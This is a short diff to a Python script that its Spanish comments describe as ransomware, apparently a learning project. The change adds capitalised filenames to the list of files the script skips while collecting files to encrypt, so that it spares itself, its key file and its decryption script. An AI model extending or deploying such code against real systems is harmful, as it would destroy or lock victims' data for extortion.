@@ -22,7 +22,7 @@ for file in os.listdir():
 	# Como nuestro archivo ransomware se encuentra en la misma carpeta, debemos validar que el 
 	# archivo que estamos añadiendo a la lista no sea nuestro propio malware. Además de validar que el 
 	# archivo no sea nuestra llave de encripción que se genera más adelante en este mismo código ni el archivo que funciona para recuperar la información.
-	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
+	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "Ransomware.py" or file == "Decrypt.py":
 
 		continue
 
